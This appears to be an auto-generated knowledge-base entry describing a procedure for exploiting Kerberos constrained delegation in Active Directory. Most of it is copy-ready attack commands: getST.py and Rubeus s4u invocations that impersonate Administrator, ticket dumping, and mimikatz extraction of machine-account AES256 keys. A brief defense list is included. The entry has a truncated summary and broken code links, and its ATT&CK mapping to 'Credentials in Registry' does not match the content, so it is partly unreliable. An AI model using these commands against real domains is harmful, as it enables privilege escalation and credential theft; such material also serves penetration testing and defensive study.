---
id: 72cf6823-33be-4748-ad6d-bee821226dc4
name: Kerberos Constrained Delegation Exploitation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:07.708222+00:00'
updated_at: '2023-04-10T20:26:26.271507+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
techniques:
- '[[Credentials in Registry|T1214 - Credentials in Registry]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Exploit the Constrained Delegation]]'
- '[[Kerberos Constrained Delegation]]'
commands:
- '[[Accessing remote directory]]'
- '[[Create a ticket]]'
- '[[Dump ticket]]'
- '[[Retrieve Service Ticket]]'
- '[[S4U delegation with NT hash]]'
- '[[S4U delegation with password]]'
---

# Kerberos Constrained Delegation Exploitation

## Summary

Kerberos Constrained Delegation is a feature in Active Directory that allows a service to impersonate a user to access resources on behalf of that user. This can be exploited by attackers to gain access to sensitive information or systems. In this procedure, we will use various tools to exploit the

## Description

# Description

Kerberos Constrained Delegation is a feature in Active Directory that allows a service to impersonate a user to access resources on behalf of that user. This can be exploited by attackers to gain access to sensitive information or systems. In this procedure, we will use various tools to exploit the Constrained Delegation feature and obtain a service ticket. We will then use this ticket to impersonate the user and gain access to resources that the user has permission to access. This procedure can be used by attackers to gain access to sensitive information or systems.

 

## Requirements

1. Domain user credentials with permissions to access resources.

1. Access to a machine on the domain.

1. Tools such as Rubeus and Mimikatz.

 

## Defense

1. Implement the principle of least privilege to limit the permissions of users and services.

1. Enable Kerberos resource-based constrained delegation instead of unconstrained delegation.

1. Monitor and log Kerberos authentication events to detect suspicious activity.

 

## Objectives

1. Obtain a service ticket using the Retrieve Service Ticket command.

1. Use the S4U2 Attack using Rubeus command to impersonate the user and gain access to resources.

1. Use the S4U2 Attack Impersonation with Existing Ticket command to impersonate the user and gain access to resources.

1. Get AES256 Keys and Create a Ticket to gain access to resources.

 

# Instructions

1. This command retrieves a service ticket for the specified target host and user credentials. The -spn option specifies the service principal name of the target service. The 'DOMAIN/user:password' argument specifies the user credentials to use for authentication. The -impersonate option specifies the account to impersonate when requesting the service ticket. The -dc-ip option specifies the IP address of the domain controller to use for authentication.

 



**Code**: [[getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:passw]]



> This command is useful for performing pass-the-ticket attacks, where an attacker can use a stolen service ticket to authenticate to a target service without needing to know the user's password. It can also be used for testing the security of Kerberos authentication in a network environment.



**Command** ([[Retrieve Service Ticket]]):

```bash
getST.py -spn HOST/SQL01.DOMAIN 'DOMAIN/user:password' -impersonate Administrator -dc-ip 10.10.10.10
```



2. The S4U2 attack is a technique used to impersonate a user account to gain access to resources that the user has access to. The Rubeus tool provides a method to perform the S4U2 attack. The command can be run with a password or a NT hash. The command impersonates the user specified and uses the msdsspn parameter to specify the service principal name (SPN) of the target resource. The altservice parameter is used to specify the alternate service types for the SPN. The ptt parameter is used to inject a ticket into the current logon session.

 



**Code**: [[# with a password
Rubeus.exe s4u /nowrap /msdsspn:]]



> The command has the following arguments:
- /user: The user account to impersonate.
- /rc4: The NT hash of the user account password.
- /impersonateuser: The user account to impersonate.
- /domain: The domain of the user account.
- /dc: The domain controller to use for the request.
- /msdsspn: The service principal name of the target resource.
- /altservice: The alternate service types for the SPN.
- /ptt: Inject the ticket into the current logon session.



**Command** ([[S4U delegation with password]]):

```bash
Rubeus.exe s4u /nowrap /msdsspn:"time/target.local" /altservice:cifs /impersonateuser:"administrator" /domain:"domain" /user:"user" /password:"password"
```





**Command** ([[S4U delegation with NT hash]]):

```bash
Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:time/srv01.domain.com /altservice:cifs /ptt
Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:"cifs/dc.domain.com" /altservice:cifs,http,host,rpcss,wsman,ldap /ptt
```





**Command** ([[Accessing remote directory]]):

```bash
dir \\dc.domain.com\c$
```



3. To use this command, first dump an existing ticket using the 'tgtdeleg', 'triage', and 'dump' commands. Then, use the 's4u' command to perform a S4U2 attack by impersonating a user with the '/impersonateuser' flag and specifying the SPN with the '/msdsspn' flag. Finally, use the '/ticket' flag to provide the ticket obtained from the 'dump' command. The '/ptt' flag can be used to execute the ticket in the current session.

 



**Code**: [[# Dump ticket
Rubeus.exe tgtdeleg /nowrap
Rubeus.e]]



> This command is used to perform a S4U2 attack to impersonate a user by using an existing ticket. This can be useful for lateral movement or privilege escalation within a network. The 'tgtdeleg' command is used to obtain a ticket granting ticket (TGT) for the current user. The 'triage' command is used to identify any available tickets to be used for the attack. The 'dump' command is used to dump the ticket for a specific logon session ID (LUID). The 's4u' command is used to perform the S4U2 attack, which allows a user to obtain a service ticket (ST) for a specific service principal name (SPN) without having to know the password for the account associated with the SPN.



**Command** ([[Dump ticket]]):

```bash
Rubeus.exe tgtdeleg /nowrap
Rubeus.exe triage
Rubeus.exe dump /luid:0x12d1f7
```





**Command** ([[Create a ticket]]):

```bash
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:cifs/srv.domain.local /ticket:doIFRjCCBUKgAwIBB...BTA== /ptt
```



4. This command is used to get the AES256 keys of the machine account and create a ticket. The first part of the command retrieves the keys and the second part creates a ticket. The arguments used in the command are:
- privilege::debug: This argument is used to enable debug privileges.
- token::elevate: This argument is used to elevate the token privileges.
- sekurlsa::ekeys: This argument is used to retrieve the AES256 keys of the machine account.
- s4u: This argument is used to impersonate a user.
- /impersonateuser:Administrator: This argument is used to impersonate the Administrator user.
- /msdsspn:cifs/srv.domain.local: This argument is used to specify the SPN for the service.
- /user:win10x64$: This argument is used to specify the user account.
- /aes256:4b55f...fd82: This argument is used to specify the AES256 key.
- /ptt: This argument is used to pass the ticket to the current process.

 



**Code**: [[# Get aes256 keys of the machine account
privilege]]



> This command is useful for retrieving the AES256 keys of the machine account and creating a ticket. The ticket can be used for various purposes such as accessing resources and services on the network. It is important to note that this command requires elevated privileges and should be used with caution.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]

### Techniques

- [[Credentials in Registry|T1214 - Credentials in Registry]]

## Commands Used

- [[Accessing remote directory]]
- [[Create a ticket]]
- [[Dump ticket]]
- [[Retrieve Service Ticket]]
- [[S4U delegation with NT hash]]
- [[S4U delegation with password]]

## Tags

- [[Active Directory Attacks]]
- [[Exploit the Constrained Delegation]]
- [[Kerberos Constrained Delegation]]


